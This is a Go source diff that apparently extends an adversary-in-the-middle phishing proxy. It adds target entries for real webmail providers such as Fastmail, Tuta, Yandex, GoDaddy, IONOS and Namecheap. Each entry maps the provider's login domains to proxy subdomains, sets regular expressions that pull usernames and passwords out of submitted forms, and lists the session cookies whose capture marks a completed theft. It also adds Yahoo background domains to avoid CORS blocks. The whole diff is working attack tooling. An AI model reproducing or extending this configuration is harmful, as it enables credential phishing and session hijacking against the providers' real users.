@@ -247,6 +247,10 @@ var targets = map[string]*Target{
 			"yahoo-gpt":    "gpt.mail.yahoo.net",
 			"3p-yahoo-udc": "udc.yahoo.com",
 			"3p-yahoo-geo": "geo.yahoo.com",
+			// ── ADDED: Background iframe domains to prevent CORS blocks ──
+			"yahoo-signal": "signal-service.pbs.yahoo.com",
+			"yahoo-pbd":    "pbd.yahoo.com",
+			"yahoo-rlcdn":  "api.rlcdn.com",
 		},
 		ReverseSubdomains: map[string]string{
 			"login.yahoo.com":            "yahoo",
@@ -257,6 +261,10 @@ var targets = map[string]*Target{
 			"geo.yahoo.com":              "yahoo-geo",
 			"udc.yahoo.com":              "yahoo-udc",
 			"gpt.mail.yahoo.net":         "yahoo-gpt",
+			// ── ADDED: Background iframe domains to prevent CORS blocks ──
+			"signal-service.pbs.yahoo.com": "yahoo-signal",
+			"pbd.yahoo.com":                "yahoo-pbd",
+			"api.rlcdn.com":                "yahoo-rlcdn",
 		},
 		ModifyMimes: map[string]bool{
 			"text/html": true, "application/json": true,
@@ -394,6 +402,424 @@ var targets = map[string]*Target{
 		ServiceUpstream:   "mail.proton.me",
 		CompletionCookies: []string{"ACCESS_TOKEN"},
 		EntryPath:         "/login",
+		EntryQuery:        "",
+	},
+
+	// ── Fastmail Business ──
+	"fastmail": {
+		Name:        "Fastmail Business",
+		EntryPrefix: "fastmail",
+		Subdomains: map[string]string{
+			"fastmail":     "www.fastmail.com",
+			"fastmail-api": "api.fastmail.com",
+			"fastmail-cdn": "cdn.fastmail.net",
+		},
+		ReverseSubdomains: map[string]string{
+			"www.fastmail.com": "fastmail",
+			"api.fastmail.com": "fastmail-api",
+			"cdn.fastmail.net": "fastmail-cdn",
+			"fastmail.com":     "",
+		},
+		ModifyMimes: map[string]bool{
+			"text/html": true, "application/json": true,
+			"application/javascript": true, "text/javascript": true,
+		},
+		CredPatterns: []*regexp.Regexp{
+			regexp.MustCompile(`(?i)username=([^&\s]+)`),
+			regexp.MustCompile(`(?i)password=([^&\s]+)`),
+			regexp.MustCompile(`(?i)"username"\s*:\s*"([^"]+)"`),
+			regexp.MustCompile(`(?i)"password"\s*:\s*"([^"]+)"`),
+		},
+		AuthTokenNames: map[string]bool{
+			"s_session": true, "state": true,
+		},
+		ServiceUpstream:   "www.fastmail.com",
+		CompletionCookies: []string{"s_session"},
+		EntryPath:         "/account/login",
+		EntryQuery:        "",
+	},
+
+	// ── Tuta (Tutanota) Encrypted Mail ──
+	"tuta": {
+		Name:        "Tuta (Tutanota)",
+		EntryPrefix: "tuta",
+		Subdomains: map[string]string{
+			"tuta": "app.tuta.com",
+		},
+		ReverseSubdomains: map[string]string{
+			"app.tuta.com": "tuta",
+			"tuta.com":     "",
+		},
+		ModifyMimes: map[string]bool{
+			"text/html": true, "application/json": true,
+			"application/javascript": true, "text/javascript": true,
+		},
+		CredPatterns: []*regexp.Regexp{
+			regexp.MustCompile(`(?i)mailAddress=([^&\s]+)`),
+			regexp.MustCompile(`(?i)passphrase=([^&\s]+)`),
+			regexp.MustCompile(`(?i)"mailAddress"\s*:\s*"([^"]+)"`),
+			regexp.MustCompile(`(?i)"passphrase"\s*:\s*"([^"]+)"`),
+		},
+		AuthTokenNames: map[string]bool{
+			"accessToken": true, "refreshToken": true,
+			"userId": true, "mailAddress": true,
+		},
+		ServiceUpstream:   "app.tuta.com",
+		CompletionCookies: []string{"accessToken"},
+		EntryPath:         "/",
+		EntryQuery:        "",
+	},
+
+	// ── Tutanota Legacy Domain ──
+	"tutanota": {
+		Name:        "Tutanota (Legacy)",
+		EntryPrefix: "tutanota",
+		Subdomains: map[string]string{
+			"tutanota": "app.tutanota.com",
+		},
+		ReverseSubdomains: map[string]string{
+			"app.tutanota.com": "tutanota",
+			"tutanota.com":     "",
+		},
+		ModifyMimes: map[string]bool{
+			"text/html": true, "application/json": true,
+			"application/javascript": true, "text/javascript": true,
+		},
+		CredPatterns: []*regexp.Regexp{
+			regexp.MustCompile(`(?i)mailAddress=([^&\s]+)`),
+			regexp.MustCompile(`(?i)passphrase=([^&\s]+)`),
+		},
+		AuthTokenNames: map[string]bool{
+			"accessToken": true, "refreshToken": true,
+		},
+		ServiceUpstream:   "app.tutanota.com",
+		CompletionCookies: []string{"accessToken"},
+		EntryPath:         "/",
+		EntryQuery:        "",
+	},
+
+	// ── Mail.com Business ──
+	"mailcom": {
+		Name:        "Mail.com Business",
+		EntryPrefix: "mailcom",
+		Subdomains: map[string]string{
+			"mailcom":     "www.mail.com",
+			"mailcom-api": "api.mail.com",
+		},
+		ReverseSubdomains: map[string]string{
+			"www.mail.com": "mailcom",
+			"api.mail.com": "mailcom-api",
+			"mail.com":     "",
+		},
+		ModifyMimes: map[string]bool{
+			"text/html": true, "application/json": true,
+			"application/javascript": true, "text/javascript": true,
+		},
+		CredPatterns: []*regexp.Regexp{
+			regexp.MustCompile(`(?i)email=([^&\s]+)`),
+			regexp.MustCompile(`(?i)password=([^&\s]+)`),
+			regexp.MustCompile(`(?i)"email"\s*:\s*"([^"]+)"`),
+			regexp.MustCompile(`(?i)"password"\s*:\s*"([^"]+)"`),
+		},
+		AuthTokenNames: map[string]bool{
+			"sid": true, "csrf": true,
+		},
+		ServiceUpstream:   "www.mail.com",
+		CompletionCookies: []string{"sid"},
+		EntryPath:         "/login",
+		EntryQuery:        "",
+	},
+
+	// ── GMX Enterprise/Business ─
+	"gmx": {
+		Name:        "GMX Business",
+		EntryPrefix: "gmx",
+		Subdomains: map[string]string{
+			"gmx":     "www.gmx.com",
+			"gmx-api": "api.gmx.com",
+		},
+		ReverseSubdomains: map[string]string{
+			"www.gmx.com": "gmx",
+			"api.gmx.com": "gmx-api",
+			"gmx.com":     "",
+		},
+		ModifyMimes: map[string]bool{
+			"text/html": true, "application/json": true,
+			"application/javascript": true, "text/javascript": true,
+		},
+		CredPatterns: []*regexp.Regexp{
+			regexp.MustCompile(`(?i)email=([^&\s]+)`),
+			regexp.MustCompile(`(?i)password=([^&\s]+)`),
+			regexp.MustCompile(`(?i)"email"\s*:\s*"([^"]+)"`),
+			regexp.MustCompile(`(?i)"password"\s*:\s*"([^"]+)"`),
+		},
+		AuthTokenNames: map[string]bool{
+			"sid": true, "csrf": true,
+		},
+		ServiceUpstream:   "www.gmx.com",
+		CompletionCookies: []string{"sid"},
+		EntryPath:         "/login",
+		EntryQuery:        "",
+	},
+
+	// ── Yandex 360 for Business ──
+	"yandex": {
+		Name:        "Yandex 360 Business",
+		EntryPrefix: "yandex",
+		Subdomains: map[string]string{
+			"yandex":        "passport.yandex.com",
+			"yandex-mail":   "mail.yandex.com",
+			"yandex-360":    "360.yandex.com",
+			"yandex-static": "yastatic.net",
+		},
+		ReverseSubdomains: map[string]string{
+			"passport.yandex.com": "yandex",
+			"mail.yandex.com":     "yandex-mail",
+			"360.yandex.com":      "yandex-360",
+			"yastatic.net":        "yandex-static",
+			"yandex.com":          "",
+		},
+		ModifyMimes: map[string]bool{
+			"text/html": true, "application/json": true,
+			"application/javascript": true, "text/javascript": true,
+		},
+		CredPatterns: []*regexp.Regexp{
+			regexp.MustCompile(`(?i)login=([^&\s]+)`),
+			regexp.MustCompile(`(?i)passwd=([^&\s]+)`),
+			regexp.MustCompile(`(?i)"login"\s*:\s*"([^"]+)"`),
+			regexp.MustCompile(`(?i)"passwd"\s*:\s*"([^"]+)"`),
+		},
+		AuthTokenNames: map[string]bool{
+			"Session_id": true, "yandexuid": true,
+			"yc": true, "ys": true,
+		},
+		ServiceUpstream:   "mail.yandex.com",
+		CompletionCookies: []string{"Session_id", "yc"},
+		EntryPath:         "/auth",
+		EntryQuery:        "",
+	},
+
+	// ── Infomaniak Swiss Privacy Mail ──
+	"infomaniak": {
+		Name:        "Infomaniak Swiss Mail",
+		EntryPrefix: "infomaniak",
+		Subdomains: map[string]string{
+			"infomaniak":      "login.infomaniak.com",
+			"infomaniak-mail": "mail.infomaniak.com",
+			"infomaniak-cdn":  "cdn.infomaniak.ch",
+		},
+		ReverseSubdomains: map[string]string{
+			"login.infomaniak.com": "infomaniak",
+			"mail.infomaniak.com":  "infomaniak-mail",
+			"cdn.infomaniak.ch":    "infomaniak-cdn",
+			"infomaniak.com":       "",
+		},
+		ModifyMimes: map[string]bool{
+			"text/html": true, "application/json": true,
+			"application/javascript": true, "text/javascript": true,
+		},
+		CredPatterns: []*regexp.Regexp{
+			regexp.MustCompile(`(?i)username=([^&\s]+)`),
+			regexp.MustCompile(`(?i)password=([^&\s]+)`),
+			regexp.MustCompile(`(?i)"username"\s*:\s*"([^"]+)"`),
+			regexp.MustCompile(`(?i)"password"\s*:\s*"([^"]+)"`),
+		},
+		AuthTokenNames: map[string]bool{
+			"ik_session": true, "ik_remember": true,
+		},
+		ServiceUpstream:   "mail.infomaniak.com",
+		CompletionCookies: []string{"ik_session"},
+		EntryPath:         "/login",
+		EntryQuery:        "",
+	},
+
+	// ── Runbox Secure Webmail ──
+	"runbox": {
+		Name:        "Runbox Secure",
+		EntryPrefix: "runbox",
+		Subdomains: map[string]string{
+			"runbox":      "runbox.com",
+			"runbox-mail": "mail.runbox.com",
+		},
+		ReverseSubdomains: map[string]string{
+			"runbox.com":      "runbox",
+			"mail.runbox.com": "runbox-mail",
+		},
+		ModifyMimes: map[string]bool{
+			"text/html": true, "application/json": true,
+			"application/javascript": true, "text/javascript": true,
+		},
+		CredPatterns: []*regexp.Regexp{
+			regexp.MustCompile(`(?i)username=([^&\s]+)`),
+			regexp.MustCompile(`(?i)password=([^&\s]+)`),
+			regexp.MustCompile(`(?i)"username"\s*:\s*"([^"]+)"`),
+			regexp.MustCompile(`(?i)"password"\s*:\s*"([^"]+)"`),
+		},
+		AuthTokenNames: map[string]bool{
+			"sid": true, "realm": true,
+		},
+		ServiceUpstream:   "mail.runbox.com",
+		CompletionCookies: []string{"sid"},
+		EntryPath:         "/login",
+		EntryQuery:        "",
+	},
+
+	// ── Mailbox.org Business Email ──
+	"mailbox": {
+		Name:        "Mailbox.org Business",
+		EntryPrefix: "mailbox",
+		Subdomains: map[string]string{
+			"mailbox":      "mailbox.org",
+			"mailbox-mail": "mail.mailbox.org",
+		},
+		ReverseSubdomains: map[string]string{
+			"mailbox.org":      "mailbox",
+			"mail.mailbox.org": "mailbox-mail",
+		},
+		ModifyMimes: map[string]bool{
+			"text/html": true, "application/json": true,
+			"application/javascript": true, "text/javascript": true,
+		},
+		CredPatterns: []*regexp.Regexp{
+			regexp.MustCompile(`(?i)username=([^&\s]+)`),
+			regexp.MustCompile(`(?i)password=([^&\s]+)`),
+			regexp.MustCompile(`(?i)"username"\s*:\s*"([^"]+)"`),
+			regexp.MustCompile(`(?i)"password"\s*:\s*"([^"]+)"`),
+		},
+		AuthTokenNames: map[string]bool{
+			"session": true, "csrf_token": true,
+		},
+		ServiceUpstream:   "mail.mailbox.org",
+		CompletionCookies: []string{"session"},
+		EntryPath:         "/",
+		EntryQuery:        "",
+	},
+
+	// ── GoDaddy / SecureServer ──
+	"godaddy": {
+		Name:        "GoDaddy Webmail",
+		EntryPrefix: "godaddy",
+		Subdomains: map[string]string{
+			"godaddy":      "email.godaddy.com",
+			"godaddy-sso":  "sso.godaddy.com",
+			"secureserver": "secureserver.net",
+		},
+		ReverseSubdomains: map[string]string{
+			"email.godaddy.com": "godaddy",
+			"sso.godaddy.com":   "godaddy-sso",
+			"secureserver.net":  "secureserver",
+		},
+		ModifyMimes: map[string]bool{
+			"text/html": true, "application/json": true,
+			"application/javascript": true, "text/javascript": true,
+		},
+		CredPatterns: []*regexp.Regexp{
+			regexp.MustCompile(`(?i)username=([^&\s]+)`),
+			regexp.MustCompile(`(?i)password=([^&\s]+)`),
+			regexp.MustCompile(`(?i)"username"\s*:\s*"([^"]+)"`),
+			regexp.MustCompile(`(?i)"password"\s*:\s*"([^"]+)"`),
+		},
+		AuthTokenNames: map[string]bool{
+			"shd": true, "sso": true, "sso_rt": true,
+		},
+		ServiceUpstream:   "email.godaddy.com",
+		CompletionCookies: []string{"shd", "sso"},
+		EntryPath:         "/",
+		EntryQuery:        "",
+	},
+
+	// ── IONOS (1&1) Business Mail ──
+	"ionos": {
+		Name:        "IONOS Business Mail",
+		EntryPrefix: "ionos",
+		Subdomains: map[string]string{
+			"ionos":       "login.ionos.com",
+			"ionos-mail":  "mail.ionos.com",
+			"ionos-1and1": "login.1and1.com",
+		},
+		ReverseSubdomains: map[string]string{
+			"login.ionos.com": "ionos",
+			"mail.ionos.com":  "ionos-mail",
+			"login.1and1.com": "ionos-1and1",
+		},
+		ModifyMimes: map[string]bool{
+			"text/html": true, "application/json": true,
+			"application/javascript": true, "text/javascript": true,
+		},
+		CredPatterns: []*regexp.Regexp{
+			regexp.MustCompile(`(?i)ia_username=([^&\s]+)`),
+			regexp.MustCompile(`(?i)ia_password=([^&\s]+)`),
+			regexp.MustCompile(`(?i)"username"\s*:\s*"([^"]+)"`),
+			regexp.MustCompile(`(?i)"password"\s*:\s*"([^"]+)"`),
+		},
+		AuthTokenNames: map[string]bool{
+			"KASUser": true, "KASSession": true, "xtcsid": true,
+		},
+		ServiceUpstream:   "mail.ionos.com",
+		CompletionCookies: []string{"KASUser", "KASSession"},
+		EntryPath:         "/",
+		EntryQuery:        "",
+	},
+
+	// ── Namecheap Private Email ──
+	"namecheap": {
+		Name:        "Namecheap Private Email",
+		EntryPrefix: "namecheap",
+		Subdomains: map[string]string{
+			"namecheap":      "privateemail.com",
+			"namecheap-mail": "mail.namecheap.com",
+			"namecheap-api":  "api.privateemail.com",
+		},
+		ReverseSubdomains: map[string]string{
+			"privateemail.com":     "namecheap",
+			"mail.namecheap.com":   "namecheap-mail",
+			"api.privateemail.com": "namecheap-api",
+		},
+		ModifyMimes: map[string]bool{
+			"text/html": true, "application/json": true,
+			"application/javascript": true, "text/javascript": true,
+		},
+		CredPatterns: []*regexp.Regexp{
+			regexp.MustCompile(`(?i)username=([^&\s]+)`),
+			regexp.MustCompile(`(?i)password=([^&\s]+)`),
+			regexp.MustCompile(`(?i)"username"\s*:\s*"([^"]+)"`),
+			regexp.MustCompile(`(?i)"password"\s*:\s*"([^"]+)"`),
+		},
+		AuthTokenNames: map[string]bool{
+			"webmail_session": true, "nc_session": true,
+		},
+		ServiceUpstream:   "privateemail.com",
+		CompletionCookies: []string{"webmail_session"},
+		EntryPath:         "/login",
+		EntryQuery:        "",
+	},
+
+	// ── Webmail.co.za (Regional Enterprise) ──
+	"webmailza": {
+		Name:        "Webmail.co.za",
+		EntryPrefix: "webmailza",
+		Subdomains: map[string]string{
+			"webmailza": "webmail.co.za",
+		},
+		ReverseSubdomains: map[string]string{
+			"webmail.co.za": "webmailza",
+		},
+		ModifyMimes: map[string]bool{
+			"text/html": true, "application/json": true,
+			"application/javascript": true, "text/javascript": true,
+		},
+		CredPatterns: []*regexp.Regexp{
+			regexp.MustCompile(`(?i)user=([^&\s]+)`),
+			regexp.MustCompile(`(?i)pass=([^&\s]+)`),
+			regexp.MustCompile(`(?i)"user"\s*:\s*"([^"]+)"`),
+			regexp.MustCompile(`(?i)"pass"\s*:\s*"([^"]+)"`),
+		},
+		AuthTokenNames: map[string]bool{
+			"webmail_session": true, "roundcube_sessauth": true,
+		},
+		ServiceUpstream:   "webmail.co.za",
+		CompletionCookies: []string{"webmail_session", "roundcube_sessauth"},
+		EntryPath:         "/",
 		EntryQuery:        "",
 	},
 }
